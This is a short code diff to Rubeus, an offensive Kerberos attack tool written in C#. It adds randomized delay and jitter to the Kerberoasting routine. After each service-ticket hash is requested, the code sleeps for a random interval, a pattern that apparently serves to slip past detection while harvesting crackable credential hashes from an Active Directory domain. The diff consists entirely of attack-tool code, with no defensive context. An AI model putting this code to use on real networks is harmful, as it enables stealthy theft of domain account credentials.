@@ -6,6 +6,7 @@ using System.Text.RegularExpressions;
 using System.Security.Principal;
 using System.DirectoryServices;
 using System.DirectoryServices.AccountManagement;
+using System.Threading;
 
 namespace Rubeus
 {
@@ -264,7 +265,7 @@ namespace Rubeus
             }
         }
 
-        public static void Kerberoast(string spn = "", string userName = "", string OUName = "", string domain = "", string dc = "", System.Net.NetworkCredential cred = null, string outFile = "", KRB_CRED TGT = null, bool useTGTdeleg = false, string supportedEType = "rc4")
+        public static void Kerberoast(string spn = "", string userName = "", string OUName = "", string domain = "", string dc = "", System.Net.NetworkCredential cred = null, string outFile = "", KRB_CRED TGT = null, bool useTGTdeleg = false, string supportedEType = "rc4", int delay=0, int jitter=0)
         {
             Console.WriteLine("\r\n[*] Action: Kerberoasting\r\n");
 
@@ -529,6 +530,12 @@ namespace Rubeus
                         {
                             // otherwise use the KerberosRequestorSecurityToken method
                             GetTGSRepHash(servicePrincipalName, samAccountName, distinguishedName, cred, outFile);
+                        }
+
+                        var timeToSleep = Helpers.RandomDelayWithJitter(delay, jitter);
+                        if (timeToSleep != 0)
+                        {
+                            Thread.Sleep(timeToSleep);
                         }
                     }
                 }
